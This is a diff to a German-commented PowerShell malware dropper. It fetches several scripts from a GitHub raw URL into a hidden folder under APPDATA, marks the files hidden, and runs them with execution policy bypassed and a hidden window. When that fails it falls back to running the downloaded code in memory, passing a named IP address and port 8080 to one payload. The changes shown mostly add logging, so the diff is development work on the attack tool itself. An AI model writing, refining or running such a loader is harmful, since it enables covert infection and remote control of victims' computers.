@@ -7,7 +7,7 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD INS SYSTEM-VERZEICHNIS + AUSFÜHRUNG (PARALLEL DOWNLOAD) ====================
+# ==================== DOWNLOAD INS SYSTEM-VERZEICHNIS + AUSFÜHRUNG (PARALLEL DOWNLOAD MIT LOGGING) ====================
 # Pfade (hidden System-Verzeichnis)
 $baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
 $operationDir = Join-Path $baseDir "operation"
@@ -39,7 +39,7 @@ $scripts = @(
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; FileName = "WindowsTransmitter.ps1" }
 )
 
-# Parallel Downloads via Jobs (schnell!)
+# Parallel Downloads via Jobs (schnell, mit detailliertem Logging!)
 $downloadJobs = @()
 foreach ($script in $scripts) {
     $job = Start-Job -ScriptBlock {
@@ -48,22 +48,24 @@ foreach ($script in $scripts) {
             Set-ExecutionPolicy Bypass -Scope Process -Force
             $filePath = Join-Path $targetDir $fileName
             $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-            Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing -Headers $headers -ErrorAction SilentlyContinue
-            Set-HiddenAttribute -path $filePath  # File hidden machen
-            if (Test-Path $filePath) {
+            Write-Output "LOG: Starte Download für $fileName von $url"
+            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Headers $headers -ErrorAction Stop
+            Write-Output "RESPONSE for $fileName: Status $($response.StatusCode), Length $($response.Content.Length) Bytes"
+            Write-Output "HEADERS for $fileName: $($response.Headers | Out-String)"
+            if ($response.Content.Length -gt 0) {
+                $response.Content | Out-File -FilePath $filePath -Encoding UTF8
+                Set-HiddenAttribute -path $filePath
                 $fileSize = (Get-Item $filePath).Length
-                if ($fileSize -eq 0) { 
-                    Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD WARN ${fileName} : File leer (0 Bytes) – URL prüfen!" -ErrorAction SilentlyContinue
-                    Write-Output "WARNING: $fileName ist leer (0 Bytes)"
-                } else {
-                    Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath (Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
-                    Write-Output "DOWNLOADED: $fileName -> $filePath (Size: $fileSize Bytes)"
-                }
+                Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath (Response Length: $($response.Content.Length), File Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
+                Write-Output "DOWNLOADED: $fileName -> $filePath (Size: $fileSize Bytes)"
+            } else {
+                Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD WARN ${fileName} : Response leer (Length 0 Bytes) – URL prüfen!" -ErrorAction SilentlyContinue
+                Write-Output "WARNING: $fileName Response leer (0 Bytes) – kein File gespeichert"
             }
         } catch {
             $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER ${fileName} : $errorMsg" -ErrorAction SilentlyContinue
-            Write-Output "ERROR DOWNLOAD: $fileName - $errorMsg"
+            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER ${fileName} : $errorMsg (Full Exception: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
+            Write-Output "ERROR DOWNLOAD: $fileName - $errorMsg (Full: $($_.Exception | Out-String))"
         }
     } -ArgumentList $script.Url, $script.FileName, $targetDir, $logPath
     $downloadJobs += $job
@@ -73,7 +75,8 @@ foreach ($script in $scripts) {
 # Warte kurz auf Downloads, dann Exec
 Start-Sleep -Seconds 3  # Etwas länger für Downloads
 foreach ($job in $downloadJobs) {
-    Receive-Job $job | Out-Null
+    $jobOutput = Receive-Job $job
+    Write-Host "Job-Output for Downloads: $jobOutput"  # Extra Debug: Voll-Output der Jobs
     Remove-Job $job -Force
 }
 
@@ -84,6 +87,7 @@ foreach ($script in $scripts) {
     if (Test-Path $filePath) {
         try {
             $fileSize = (Get-Item $filePath).Length
+            Write-Host "File-Check: $($script.FileName) Size $fileSize Bytes"  # Debug
             if ($fileSize -eq 0) {
                 Write-Host "SKIP FILE EXEC: $($script.FileName) ist leer – Fallback In-Memory..."  # Debug
             } else {
@@ -94,41 +98,43 @@ foreach ($script in $scripts) {
                     $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
                 }
                 Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
-                Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath" -ErrorAction SilentlyContinue
+                Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath (Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
                 Write-Host "SUCCESS FILE EXEC: $($script.FileName)"  # Debug
                 $execSuccess = $true
             }
         } catch {
             $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER ${script.FileName} : $errorMsg" -ErrorAction SilentlyContinue
-            Write-Host "ERROR FILE EXEC: $($script.FileName) - $errorMsg"
+            Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER ${script.FileName} : $errorMsg (Full: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
+            Write-Host "ERROR FILE EXEC: $($script.FileName) - $errorMsg (Full: $($_.Exception | Out-String))"
         }
     } else {
-        Write-Host "NO FILE: $($script.FileName) nicht gedownloaded – Fallback In-Memory..."  # Debug
+        Write-Host "NO FILE: $($script.FileName) nicht vorhanden – Fallback In-Memory..."  # Debug
     }
 
     # Fallback: In-Memory Exec (wie dein manueller Befehl)
     if (-not $execSuccess) {
         try {
             $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-            $content = Invoke-WebRequest -Uri $script.Url -UseBasicParsing -Headers $headers -ErrorAction SilentlyContinue | % { $_.Content }
-            if ($content -and $content.Length -gt 0) {
-                Write-Host "In-Memory Exec: $($script.FileName) (Content Length: $($content.Length))"  # Debug
+            $response = Invoke-WebRequest -Uri $script.Url -UseBasicParsing -Headers $headers -ErrorAction Stop
+            $content = $response.Content
+            Write-Host "In-Memory Check: $($script.FileName) Response Status $($response.StatusCode), Content Length $($content.Length)"  # Debug
+            if ($content.Length -gt 0) {
+                Write-Host "In-Memory Exec: $($script.FileName) (Length: $($content.Length))"  # Debug
                 $execCmd = $content
                 if ($script.FileName -eq "MicrosoftViewS.ps1") {
                     $execCmd = $content + " -a14 `"145.223.117.77`" -a15 8080 -a16 20 -a17 70"
                 }
                 $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $execCmd)
                 Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
-                Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY EXEC ${script.FileName}" -ErrorAction SilentlyContinue
+                Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY EXEC ${script.FileName} (Length: $($content.Length))" -ErrorAction SilentlyContinue
                 Write-Host "SUCCESS IN-MEMORY EXEC: $($script.FileName)"  # Debug
             } else {
-                Write-Host "SKIP IN-MEMORY: $($script.FileName) Content leer!"  # Debug
+                Write-Host "SKIP IN-MEMORY: $($script.FileName) Content leer (Length 0)!"  # Debug
             }
         } catch {
             $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY FEHLER ${script.FileName} : $errorMsg" -ErrorAction SilentlyContinue
-            Write-Host "ERROR IN-MEMORY: $($script.FileName) - $errorMsg"
+            Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY FEHLER ${script.FileName} : $errorMsg (Full: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
+            Write-Host "ERROR IN-MEMORY: $($script.FileName) - $errorMsg (Full: $($_.Exception | Out-String))"
         }
     }
     Start-Sleep -Milliseconds 200
